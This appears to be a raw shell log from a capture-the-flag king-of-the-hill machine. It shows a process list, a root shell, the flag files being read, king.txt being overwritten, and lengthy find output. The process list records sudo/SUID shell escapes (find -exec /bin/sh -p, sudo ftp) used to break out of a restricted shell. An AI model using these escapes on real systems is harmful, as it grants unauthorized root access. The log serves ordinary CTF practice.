root       853  0.0  0.1 102816  2364 ?        Ss   14:26   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclie
root       910  0.0  1.0 573896 19200 ?        Ssl  14:26   0:00 /usr/bin/python -Es /usr/sbin/tuned -l -P
root       913  0.0  0.6 356636 11996 ?        Ss   14:26   0:00 php-fpm: master process (/etc/php-fpm.conf)
root       925  0.0  0.2 112840  4292 ?        Ss   14:26   0:00 /usr/sbin/sshd -D
root       927  0.0  0.2 222760  4524 ?        Ssl  14:26   0:00 /usr/sbin/rsyslogd -n
root       929  0.0  0.3 353308  6872 ?        Ss   14:26   0:00 /usr/sbin/nmbd --foreground --no-process-group
root       933  0.0  0.0 110108   856 tty1     Ss+  14:26   0:00 /sbin/agetty --noclear tty1 linux
root       934  0.0  0.0 110108   864 ttyS0    Ss+  14:26   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
po        1061  0.8  8.7 2539780 165372 ?      Sl   14:26   0:13 /usr/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -
named     1068  0.0  3.0 167812 57620 ?        Ssl  14:26   0:00 /usr/sbin/named -u named -c /etc/named.conf
root      1123  0.0  0.8 430424 15484 ?        Ss   14:26   0:00 /usr/sbin/httpd -DFOREGROUND
mysql     1136  0.0  0.0 113312  1600 ?        Ss   14:26   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
mysql     1299  0.0  4.9 1102652 93180 ?       Sl   14:26   0:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64
root      1340  0.0  0.1  89620  2092 ?        Ss   14:26   0:00 /usr/libexec/postfix/master -w
postfix   1341  0.0  0.2  89724  4056 ?        S    14:26   0:00 pickup -l -t unix -u
postfix   1342  0.0  0.2  89792  4084 ?        S    14:26   0:00 qmgr -l -t unix -u
root      1356  0.0  0.6 424844 11636 ?        Ss   14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
po        1357  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1358  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1359  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1360  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1361  0.0  0.3 356636  6024 ?        S    14:26   0:00 php-fpm: pool www
shifu     1388  0.0  1.3 516088 24656 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1389  0.0  1.2 441020 22620 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1391  0.0  1.6 523364 31836 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
root      1401  0.0  0.1 120884  2120 ?        Ss   14:26   0:00 nginx: master process /usr/sbin/nginx
nginx     1402  0.0  0.1 121288  3580 ?        S    14:26   0:00 nginx: worker process
root      1577  0.0  0.1 419748  3116 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1578  0.0  0.1 420204  3164 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1647  0.0  0.1 424828  3200 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1698  0.0  0.3 159308  6040 ?        Ss   14:27   0:00 sshd: shifu [priv]
shifu     1704  0.0  0.1 159308  2424 ?        S    14:27   0:00 sshd: shifu@pts/0
shifu     1708  0.0  0.1 115444  2032 pts/0    Ss   14:27   0:00 -rbash
root      1728  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh ; -quit
shifu     1729  0.0  0.0 115440  1828 pts/0    S    14:27   0:00 /bin/sh
root      1732  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh -p ; -quit
root      1733  0.0  0.1 115444  1912 pts/0    S+   14:27   0:00 /bin/sh -p
shifu     1740  0.0  0.6 431424 12892 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1747  0.0  1.1 513284 21780 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1751  0.0  0.9 510540 18804 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1759  0.0  1.6 523336 31680 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1762  0.0  0.9 436032 17508 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1764  0.0  0.4 430424  8824 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1766  0.0  0.9 510540 18788 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
root      1848  0.0  1.4 437612 27900 pts/0    T    14:31   0:00 /usr/bin/python /usr/bin/yum install kernel-devel-3.10.0-862.el7.x86_64
root      1916  0.0  0.3 159308  6248 ?        Ss   14:36   0:00 sshd: shifu [priv]
shifu     1918  0.0  0.1 159308  2432 ?        S    14:36   0:00 sshd: shifu@pts/1
shifu     1919  0.0  0.1 115444  2012 pts/1    Ss   14:36   0:00 -rbash
root      1938  0.0  0.0      0     0 ?        S    14:36   0:00 [kworker/0:2]
shifu     1964  0.0  0.0 119052  1524 pts/1    S    14:39   0:00 ftp
shifu     1965  0.0  0.1 115440  1888 pts/1    S    14:39   0:00 /bin/sh
root      1999  0.0  0.0      0     0 ?        R    14:41   0:00 [kworker/0:1]
root      2026  0.0  0.2 218524  4020 pts/1    S    14:44   0:00 sudo ftp
root      2027  0.0  0.0 119052  1524 pts/1    S    14:44   0:00 ftp
root      2033  0.0  0.0 115444  1880 pts/1    S    14:45   0:00 /bin/sh
root      2063  0.1  0.0 115444   820 pts/1    S    14:49   0:00 /bin/sh
root      2615  0.1  0.0 115444   804 pts/1    S    14:51   0:00 /bin/sh
root      2724  0.0  0.0 107956   352 pts/1    S    14:51   0:00 sleep 0.1
root      2725  0.0  0.0 107956   356 pts/1    S    14:51   0:00 sleep 0.2
root      2726  0.0  0.0 155372  1872 pts/1    R+   14:51   0:00 ps aux
sh-4.2# cat king.txt
cyber30
sh-4.2# ls
king.txt  koth
sh-4.2# find / -type f -name '*.txt' -o -path '*/.*' -type f -name '*.txt' 2>/dev/null | grep flag
/usr/local/go/src/cmd/go/testdata/script/build_gcflags.txt
/usr/local/go/src/cmd/go/testdata/script/build_runtime_gcflags.txt
/usr/local/go/src/cmd/go/testdata/script/gcflags_patterns.txt
/usr/local/go/src/cmd/go/testdata/script/goflags.txt
/usr/local/go/src/cmd/go/testdata/script/modfile_flag.txt
/usr/local/go/src/cmd/go/testdata/script/test_flag.txt
/usr/local/go/src/cmd/go/testdata/script/vet_flags.txt
/home/po/flag.txt
/home/shifu/flag.txt
/home/tigress/flag.txt
sh-4.2# cat /home/po/flag.txt
MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK
sh-4.2# cat /home/shifu/flag.txt
YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
sh-4.2# cat /home/tigress/flag.txt
Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
sh-4.2# ls
king.txt  koth
sh-4.2# string
sh: string: command not found
sh-4.2# file 
Usage: file [-bchikLlNnprsvz0] [--apple] [--mime-encoding] [--mime-type]
            [-e testname] [-F separator] [-f namefile] [-m magicfiles] file ...
       file -C [-m magicfiles]
       file [--help]
sh-4.2# file koth
koth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), not stripped
sh-4.2# sudo find / -name ".flag" 2>/dev/null
/root/.flag
sh-4.2# cat .flag
NzRjZTk1ZDZhYTVmNTQyZmU5MDliMThkYzA2ZDRiYTMK
sh-4.2# ls -al
total 7340
dr-xr-x---.  5 root root    4096 Apr 12  2020 .
dr-xr-xr-x. 17 root root     224 Apr  8  2020 ..
lrwxrwxrwx   1 root root       9 Apr 10  2020 .bash_history -> /dev/null
-rw-r--r--.  1 root root      18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root     176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root     176 Dec 28  2013 .bashrc
drwxr-xr-x   3 root root      22 Apr 12  2020 .cache
-rw-r--r--.  1 root root     100 Dec 28  2013 .cshrc
-rw-r--r--   1 root root      45 Apr 12  2020 .flag
drwx------   3 root root     104 Apr 10  2020 .gnupg
-rw-------   1 root root       8 Oct  2 14:58 king.txt
-rwxr-xr-x   1 root root 7468711 Apr 12  2020 koth
lrwxrwxrwx   1 root root       9 Apr 11  2020 .mysql_history -> /dev/null
drwxr-----   3 root root      19 Apr 10  2020 .pki
-rw-r--r--.  1 root root     129 Dec 28  2013 .tcshrc
-rw-------   1 root root    6218 Apr 12  2020 .viminfo
sh-4.2# echo cyber30 > king.txt
sh-4.2# cat king.txt
cyber30
sh-4.2# wc .flag
 1  1 45 .flag

h-4.2# ls
king.txt  koth
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# ls
king.txt  koth
sh-4.2# cat king.txt
cyber30
sh-4.2# alias la='ls -al'
sh-4.2# la /home
total 0
drwxr-xr-x.  5 root    root     44 Apr 10  2020 .
dr-xr-xr-x. 17 root    root    224 Apr  8  2020 ..
drwx------   3 po      po      111 Apr 12  2020 po
drwx------   2 shifu   shifu   115 Oct  2 14:30 shifu
drwx------   3 tigress tigress 143 Apr 11  2020 tigress
sh-4.2# la /home/po
total 20
drwx------  3 po   po   111 Apr 12  2020 .
drwxr-xr-x. 5 root root  44 Apr 10  2020 ..
-rw-------  1 po   po    12 Apr 12  2020 .bash_history
-rw-r--r--  1 po   po    18 Apr 10  2018 .bash_logout
-rw-r--r--  1 po   po   193 Apr 10  2018 .bash_profile
-rw-r--r--  1 po   po   231 Apr 10  2018 .bashrc
-rw-r--r--  1 po   po    45 Apr 11  2020 flag.txt
drwx------  2 po   po    61 Apr 12  2020 .ssh
sh-4.2# la /home/shifu
total 20
drwx------  2 shifu shifu 115 Oct  2 14:30 .
drwxr-xr-x. 5 root  root   44 Apr 10  2020 ..
lrwxrwxrwx  1 root  root    9 Apr 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 shifu shifu  18 Apr 10  2018 .bash_logout
-rw-r--r--  1 shifu shifu 193 Apr 10  2018 .bash_profile
-rw-r--r--  1 shifu shifu 231 Apr 10  2018 .bashrc
-rw-r--r--  1 shifu shifu  45 Apr 11  2020 flag.txt
-rw-------  1 shifu shifu 776 Oct  2 14:30 .viminfo
sh-4.2# la /home/tigress/
total 24
drwx------  3 tigress tigress 143 Apr 11  2020 .
drwxr-xr-x. 5 root    root     44 Apr 10  2020 ..
lrwxrwxrwx  1 root    root      9 Apr 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 tigress tigress  18 Apr 10  2018 .bash_logout
-rw-r--r--  1 tigress tigress 193 Apr 10  2018 .bash_profile
-rw-r--r--  1 tigress tigress 231 Apr 10  2018 .bashrc
-rwxr-xr-x  1 tigress tigress  57 Apr 11  2020 check.sh
-rw-r--r--  1 tigress tigress  45 Apr 11  2020 flag.txt
drwx------  2 tigress tigress  61 Apr 10  2020 .ssh
-rw-------  1 tigress tigress 611 Apr 10  2020 .viminfo
sh-4.2# la /
total 32
dr-xr-xr-x.  17 root root  224 Apr  8  2020 .
dr-xr-xr-x.  17 root root  224 Apr  8  2020 ..
lrwxrwxrwx.   1 root root    7 Apr  8  2020 bin -> usr/bin
dr-xr-xr-x.   5 root root 4096 Apr 12  2020 boot
drwxr-xr-x   19 root root 2980 Oct  2 14:26 dev
drwxr-xr-x.  90 root root 8192 Apr 12  2020 etc
drwxr-xr-x.   5 root root   44 Apr 10  2020 home
lrwxrwxrwx.   1 root root    7 Apr  8  2020 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 Apr  8  2020 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   3 root root   83 Apr 10  2020 opt
dr-xr-xr-x  148 root root    0 Oct  2 14:26 proc
dr-xr-x---.   5 root root 4096 Apr 12  2020 root
drwxr-xr-x   28 root root  860 Oct  2 14:31 run
lrwxrwxrwx.   1 root root    8 Apr  8  2020 sbin -> usr/sbin
drwxr-xr-x.   3 root root   19 Apr 11  2020 srv
dr-xr-xr-x   13 root root    0 Oct  2 14:26 sys
drwxrwxrwt.  14 root root 4096 Oct  2 14:41 tmp
drwxr-xr-x.  13 root root  155 Apr  8  2020 usr
drwxr-xr-x.  21 root root 4096 Apr 11  2020 var
sh-4.2# la /var
total 20
drwxr-xr-x. 21 root root  4096 Apr 11  2020 .
dr-xr-xr-x. 17 root root   224 Apr  8  2020 ..
drwxr-xr-x.  2 root root     6 Apr 11  2018 adm
drwxr-xr-x.  6 root root    57 Apr 10  2020 cache
drwxr-xr-x.  2 root root     6 Apr 12  2018 crash
drwxr-xr-x.  3 root root    34 Apr 11  2020 db
drwxr-xr-x.  3 root root    18 Apr  8  2020 empty
drwxr-xr-x.  2 root root     6 Apr 11  2018 games
drwxr-xr-x.  2 root root     6 Apr 11  2018 gopher
drwxr-xr-x.  3 root root    18 Apr  8  2020 kerberos
drwxr-xr-x. 33 root root  4096 Apr 11  2020 lib
drwxr-xr-x.  2 root root     6 Apr 11  2018 local
lrwxrwxrwx.  1 root root    11 Apr  8  2020 lock -> ../run/lock
drwxr-xr-x. 13 root root  4096 Oct  2 14:26 log
lrwxrwxrwx.  1 root root    10 Apr  8  2020 mail -> spool/mail
drwxrwx--T   5 root named  152 Apr 16  2020 named
drwxr-xr-x.  2 root root     6 Apr 11  2018 nis
drwxr-xr-x.  2 root root     6 Apr 11  2018 opt
drwxr-xr-x.  2 root root     6 Apr 11  2018 preserve
lrwxrwxrwx.  1 root root     6 Apr  8  2020 run -> ../run
drwxr-xr-x.  9 root root   100 Apr 11  2020 spool
drwxrwxrwt.  8 root root  4096 Oct  2 14:41 tmp
-rw-r--r--.  1 root root   163 Apr  8  2020 .updated
drwxr-xr-x   4 root root    33 Apr 10  2020 www
drwxr-xr-x.  2 root root     6 Apr 11  2018 yp
sh-4.2# la /var/www
total 4
drwxr-xr-x   4 root root   33 Apr 10  2020 .
drwxr-xr-x. 21 root root 4096 Apr 11  2020 ..
drwxr-xr-x   2 root root    6 Aug  8  2019 cgi-bin
drwxr-xr-x   5 root root  143 Apr 12  2020 html
sh-4.2# la /var/www/cgi-bin
total 0
drwxr-xr-x 2 root root  6 Aug  8  2019 .
drwxr-xr-x 4 root root 33 Apr 10  2020 ..
sh-4.2# la /var/www/html
total 92
drwxr-xr-x 5 root  root    143 Apr 12  2020 .
drwxr-xr-x 4 root  root     33 Apr 10  2020 ..
drwxr-xr-x 2 shifu shifu    35 Apr 11  2020 06d63d6798d9b6c2f987f045b12031d6
drwxr-xr-x 2 shifu shifu    24 Apr 10  2020 flag
-rw-r--r-- 1 shifu shifu 75856 Apr 12  2020 image.jpg
-rw-r--r-- 1 shifu shifu   230 Apr 12  2020 index.html
-rw-r--r-- 1 shifu shifu  1345 Apr 10  2020 key.gpg
-rw-r--r-- 1 shifu shifu    10 Apr 11  2020 robots.txt
drwxr-xr-x 5 shifu shifu  4096 Apr 10  2020 wordpress
sh-4.2# cat /var/www/html/flag
cat: /var/www/html/flag: Is a directory
sh-4.2# cat /var/www/html/flag/
cat: /var/www/html/flag/: Is a directory
sh-4.2# la /var/www/html/flag
total 4
drwxr-xr-x 2 shifu shifu  24 Apr 10  2020 .
drwxr-xr-x 5 root  root  143 Apr 12  2020 ..
-rw-r--r-- 1 shifu shifu  89 Apr 10  2020 index.html
sh-4.2# cat /var/www/html/flag/index.html
5a4449794d4745314e475a694d6d59775a6a41344f4755335a5749324d7a526d5957526a5a4751354e32593d
sh-4.2# sudo find / -name "flag" 2>/dev/null
/var/www/html/flag
/var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
/usr/local/go/src/flag
sh-4.2# cat /var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
7c9d7869bcea01064694c8c59e596bdd
sh-4.2# ls
king.txt  koth
sh-4.2# ls /usr/local/go/src/flag
example_test.go  example_value_test.go  export_test.go  flag.go  flag_test.go
sh-4.2# la /var/www/html/flag
total 4
drwxr-xr-x 2 shifu shifu  24 Apr 10  2020 .
drwxr-xr-x 5 root  root  143 Apr 12  2020 ..
-rw-r--r-- 1 shifu shifu  89 Apr 10  2020 index.html
sh-4.2# sudo find / -name "user" 2>/dev/null
/proc/sys/user
/proc/1/task/1/ns/user
/proc/1/ns/user
/proc/2/task/2/ns/user
/proc/2/ns/user
/proc/3/task/3/ns/user
/proc/3/ns/user
/proc/5/task/5/ns/user
/proc/5/ns/user
/proc/6/task/6/ns/user
/proc/6/ns/user
/proc/7/task/7/ns/user
/proc/7/ns/user
/proc/8/task/8/ns/user
/proc/8/ns/user
/proc/9/task/9/ns/user
/proc/9/ns/user
/proc/10/task/10/ns/user
/proc/10/ns/user
/proc/11/task/11/ns/user
/proc/11/ns/user
/proc/13/task/13/ns/user
/proc/13/ns/user
/proc/14/task/14/ns/user
/proc/14/ns/user
/proc/15/task/15/ns/user
/proc/15/ns/user
/proc/16/task/16/ns/user
/proc/16/ns/user
/proc/18/task/18/ns/user
/proc/18/ns/user
/proc/19/task/19/ns/user
/proc/19/ns/user
/proc/20/task/20/ns/user
/proc/20/ns/user
/proc/21/task/21/ns/user
/proc/21/ns/user
/proc/22/task/22/ns/user
/proc/22/ns/user
/proc/23/task/23/ns/user
/proc/23/ns/user
/proc/24/task/24/ns/user
/proc/24/ns/user
/proc/29/task/29/ns/user
/proc/29/ns/user
/proc/30/task/30/ns/user
/proc/30/ns/user
/proc/31/task/31/ns/user
/proc/31/ns/user
/proc/32/task/32/ns/user
/proc/32/ns/user
/proc/40/task/40/ns/user
/proc/40/ns/user
/proc/42/task/42/ns/user
/proc/42/ns/user
/proc/43/task/43/ns/user
/proc/43/ns/user
/proc/44/task/44/ns/user
/proc/44/ns/user
/proc/46/task/46/ns/user
/proc/46/ns/user
/proc/59/task/59/ns/user
/proc/59/ns/user
/proc/90/task/90/ns/user
/proc/90/ns/user
/proc/269/task/269/ns/user
/proc/269/ns/user
/proc/273/task/273/ns/user
/proc/273/ns/user
/proc/274/task/274/ns/user
/proc/274/ns/user
/proc/275/task/275/ns/user
/proc/275/ns/user
/proc/276/task/276/ns/user
/proc/276/ns/user
/proc/277/task/277/ns/user
/proc/277/ns/user
/proc/341/task/341/ns/user
/proc/341/ns/user
/proc/342/task/342/ns/user
/proc/342/ns/user
/proc/352/task/352/ns/user
/proc/352/ns/user
/proc/353/task/353/ns/user
/proc/353/ns/user
/proc/365/task/365/ns/user
/proc/365/ns/user
/proc/366/task/366/ns/user
/proc/366/ns/user
/proc/367/task/367/ns/user
/proc/367/ns/user
/proc/368/task/368/ns/user
/proc/368/ns/user
/proc/369/task/369/ns/user
/proc/369/ns/user
/proc/370/task/370/ns/user
/proc/370/ns/user
/proc/371/task/371/ns/user
/proc/371/ns/user
/proc/372/task/372/ns/user
/proc/372/ns/user
/proc/373/task/373/ns/user
/proc/373/ns/user
/proc/374/task/374/ns/user
/proc/374/ns/user
/proc/375/task/375/ns/user
/proc/375/ns/user
/proc/376/task/376/ns/user
/proc/376/ns/user
/proc/443/task/443/ns/user
/proc/443/ns/user
/proc/466/task/466/ns/user
/proc/466/ns/user
/proc/474/task/474/ns/user
/proc/474/ns/user
/proc/534/task/534/ns/user
/proc/534/ns/user
/proc/546/task/546/ns/user
/proc/546/ns/user
/proc/547/task/547/ns/user
/proc/547/ns/user
/proc/548/task/548/ns/user
/proc/548/ns/user
/proc/549/task/549/ns/user
/proc/549/ns/user
/proc/550/task/550/ns/user
/proc/550/ns/user
/proc/551/task/551/ns/user
/proc/551/ns/user
/proc/552/task/552/ns/user
/proc/552/ns/user
/proc/553/task/553/ns/user
/proc/553/ns/user
/proc/569/task/569/ns/user
/proc/569/task/570/ns/user
/proc/569/ns/user
/proc/593/task/593/ns/user
/proc/593/task/609/ns/user
/proc/593/task/610/ns/user
/proc/593/task/611/ns/user
/proc/593/task/612/ns/user
/proc/593/ns/user
/proc/597/task/597/ns/user
/proc/597/task/624/ns/user
/proc/597/task/625/ns/user
/proc/597/task/626/ns/user
/proc/597/task/627/ns/user
/proc/597/task/628/ns/user
/proc/597/ns/user
/proc/601/task/601/ns/user
/proc/601/ns/user
/proc/614/task/614/ns/user
/proc/614/ns/user
/proc/616/task/616/ns/user
/proc/616/task/630/ns/user
/proc/616/task/632/ns/user
/proc/616/ns/user
/proc/617/task/617/ns/user
/proc/617/ns/user
/proc/619/task/619/ns/user
/proc/619/ns/user
/proc/853/task/853/ns/user
/proc/853/ns/user
/proc/910/task/910/ns/user
/proc/910/task/1617/ns/user
/proc/910/task/1618/ns/user
/proc/910/task/1619/ns/user
/proc/910/task/1632/ns/user
/proc/910/ns/user
/proc/913/task/913/ns/user
/proc/913/ns/user
/proc/925/task/925/ns/user
/proc/925/ns/user
/proc/927/task/927/ns/user
/proc/927/task/974/ns/user
/proc/927/task/1031/ns/user
/proc/927/ns/user
/proc/929/task/929/ns/user
/proc/929/ns/user
/proc/933/task/933/ns/user
/proc/933/ns/user
/proc/934/task/934/ns/user
/proc/934/ns/user
/proc/1061/task/1061/ns/user
/proc/1061/task/1350/ns/user
/proc/1061/task/1362/ns/user
/proc/1061/task/1386/ns/user
/proc/1061/task/1400/ns/user
/proc/1061/task/1466/ns/user
/proc/1061/task/1469/ns/user
/proc/1061/task/1472/ns/user
/proc/1061/task/1475/ns/user
/proc/1061/task/1478/ns/user
/proc/1061/task/1664/ns/user
/proc/1061/task/1667/ns/user
/proc/1061/task/1674/ns/user
/proc/1061/task/1675/ns/user
/proc/1061/task/1678/ns/user
/proc/1061/task/1679/ns/user
/proc/1061/task/1680/ns/user
/proc/1061/task/1681/ns/user
/proc/1061/task/1682/ns/user
/proc/1061/task/1683/ns/user
/proc/1061/task/1684/ns/user
/proc/1061/task/1685/ns/user
/proc/1061/task/1686/ns/user
/proc/1061/task/1687/ns/user
/proc/1061/task/1688/ns/user
/proc/1061/task/1689/ns/user
/proc/1061/task/1690/ns/user
/proc/1061/task/1691/ns/user
/proc/1061/task/1973/ns/user
/proc/1061/task/1974/ns/user
/proc/1061/task/1977/ns/user
/proc/1061/task/1981/ns/user
/proc/1061/task/1985/ns/user
/proc/1061/task/1986/ns/user
/proc/1061/task/1987/ns/user
/proc/1061/task/1988/ns/user
/proc/1061/ns/user
/proc/1068/task/1068/ns/user
/proc/1068/task/1087/ns/user
/proc/1068/task/1088/ns/user
/proc/1068/task/1089/ns/user
/proc/1068/ns/user
/proc/1123/task/1123/ns/user
/proc/1123/ns/user
/proc/1136/task/1136/ns/user
/proc/1136/ns/user
/proc/1299/task/1299/ns/user
/proc/1299/task/1416/ns/user
/proc/1299/task/1417/ns/user
/proc/1299/task/1418/ns/user
/proc/1299/task/1419/ns/user
/proc/1299/task/1420/ns/user
/proc/1299/task/1421/ns/user
/proc/1299/task/1422/ns/user
/proc/1299/task/1423/ns/user
/proc/1299/task/1424/ns/user
/proc/1299/task/1425/ns/user
/proc/1299/task/1641/ns/user
/proc/1299/task/1642/ns/user
/proc/1299/task/1643/ns/user
/proc/1299/task/1644/ns/user
/proc/1299/task/1645/ns/user
/proc/1299/task/1646/ns/user
/proc/1299/task/1656/ns/user
/proc/1299/task/1657/ns/user
/proc/1299/ns/user
/proc/1340/task/1340/ns/user
/proc/1340/ns/user
/proc/1341/task/1341/ns/user
/proc/1341/ns/user
/proc/1342/task/1342/ns/user
/proc/1342/ns/user
/proc/1356/task/1356/ns/user
/proc/1356/ns/user
/proc/1357/task/1357/ns/user
/proc/1357/ns/user
/proc/1358/task/1358/ns/user
/proc/1358/ns/user
/proc/1359/task/1359/ns/user
/proc/1359/ns/user
/proc/1360/task/1360/ns/user
/proc/1360/ns/user
/proc/1361/task/1361/ns/user
/proc/1361/ns/user
/proc/1388/task/1388/ns/user
/proc/1388/ns/user
/proc/1389/task/1389/ns/user
/proc/1389/ns/user
/proc/1391/task/1391/ns/user
/proc/1391/ns/user
/proc/1401/task/1401/ns/user
/proc/1401/ns/user
/proc/1402/task/1402/ns/user
/proc/1402/ns/user
/proc/1577/task/1577/ns/user
/proc/1577/ns/user
/proc/1578/task/1578/ns/user
/proc/1578/ns/user
/proc/1647/task/1647/ns/user
/proc/1647/ns/user
/proc/1698/task/1698/ns/user
/proc/1698/ns/user
/proc/1704/task/1704/ns/user
/proc/1704/ns/user
/proc/1708/task/1708/ns/user
/proc/1708/ns/user
/proc/1728/task/1728/ns/user
/proc/1728/ns/user
/proc/1729/task/1729/ns/user
/proc/1729/ns/user
/proc/1732/task/1732/ns/user
/proc/1732/ns/user
/proc/1733/task/1733/ns/user
/proc/1733/ns/user
/proc/1740/task/1740/ns/user
/proc/1740/ns/user
/proc/1747/task/1747/ns/user
/proc/1747/ns/user
/proc/1751/task/1751/ns/user
/proc/1751/ns/user
/proc/1759/task/1759/ns/user
/proc/1759/ns/user
/proc/1762/task/1762/ns/user
/proc/1762/ns/user
/proc/1764/task/1764/ns/user
/proc/1764/ns/user
/proc/1766/task/1766/ns/user
/proc/1766/ns/user
/proc/1848/task/1848/ns/user
/proc/1848/ns/user
/proc/1916/task/1916/ns/user
/proc/1916/ns/user
/proc/1918/task/1918/ns/user
/proc/1918/ns/user
/proc/1919/task/1919/ns/user
/proc/1919/ns/user
/proc/1964/task/1964/ns/user
/proc/1964/ns/user
/proc/1965/task/1965/ns/user
/proc/1965/ns/user
/proc/2026/task/2026/ns/user
/proc/2026/ns/user
/proc/2027/task/2027/ns/user
/proc/2027/ns/user
/proc/2033/task/2033/ns/user
/proc/2033/ns/user
/proc/2063/task/2063/ns/user
/proc/2063/ns/user
/proc/2615/task/2615/ns/user
/proc/2615/ns/user
/proc/7442/task/7442/ns/user
/proc/7442/ns/user
/proc/11632/task/11632/ns/user
/proc/11632/ns/user
/proc/22051/task/22051/ns/user
/proc/22051/ns/user
/proc/26908/task/26908/ns/user
/proc/26908/ns/user
/proc/28282/task/28282/ns/user
/proc/28282/ns/user
/proc/28284/task/28284/ns/user
/proc/28284/ns/user
/proc/28285/task/28285/ns/user
/proc/28285/ns/user
/run/user
/etc/systemd/user
/etc/xdg/systemd/user
/var/kerberos/krb5/user
/var/www/html/wordpress/wp-admin/user
/usr/lib/systemd/user
/usr/local/go/src/os/user
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/arch/has/debug/strict/user
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/crypto/user
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/have/perf/user
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/have/user
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/infiniband/user
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/rcu/user
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/user
sh-4.2# ls
king.txt  koth
sh-4.2# sudo find / -type f -name "*flag*" 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/vif-0/net/eth0/flags
/sys/devices/system/cpu/cpu0/microcode/processor_flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/root/.flag
/var/www/html/wordpress/wp-includes/images/icon-pointer-flag.png
/var/www/html/wordpress/wp-includes/images/icon-pointer-flag-2x.png
/var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
/usr/bin/pflags
/usr/lib64/perl5/bits/waitflags.ph
/usr/lib64/samba/libflag-mapping-samba4.so
/usr/share/doc/neon-0.30.0/html/refreqflags.html
/usr/share/doc/neon-0.30.0/html/refsessflags.html
/usr/share/man/man3/function::get_sa_flags.3stap.gz
/usr/share/man/man3/function::sa_flags_str.3stap.gz
/usr/share/man/man3/probe::netdev.change_rx_flag.3stap.gz
/usr/share/man/man3/probe::nfs.fop.check_flags.3stap.gz
/usr/share/man/man3/xcb_xkb_set_debugging_flags.3.gz
/usr/share/man/man3/xcb_xkb_set_debugging_flags_reply.3.gz
/usr/share/man/man3/xcb_xkb_per_client_flags.3.gz
/usr/share/man/man3/xcb_xkb_per_client_flags_reply.3.gz
/usr/share/man/man3/xcb_xkb_set_debugging_flags_unchecked.3.gz
/usr/share/man/man3/xcb_xkb_per_client_flags_unchecked.3.gz
/usr/share/systemtap/runtime/linux/autoconf-get_user_pages_remote-flags.c
/usr/share/systemtap/runtime/linux/autoconf-get_user_pages_remote-flags_locked.c
/usr/share/systemtap/runtime/linux/autoconf-ring_buffer-flags.c
/usr/share/tk8.5/demos/images/flagdown.xbm
/usr/share/tk8.5/demos/images/flagup.xbm
/usr/include/asm/processor-flags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/include/bits/waitflags.h
/usr/local/go/pkg/include/textflag.h
/usr/local/go/pkg/linux_amd64/flag.a
/usr/local/go/pkg/linux_amd64_race/flag.a
/usr/local/go/src/cmd/asm/internal/flags/flags.go
/usr/local/go/src/cmd/compile/internal/ssa/flagalloc.go
/usr/local/go/src/cmd/go/internal/base/flag.go
/usr/local/go/src/cmd/go/internal/base/goflags.go
/usr/local/go/src/cmd/go/internal/cmdflag/flag.go
/usr/local/go/src/cmd/go/internal/load/flag.go
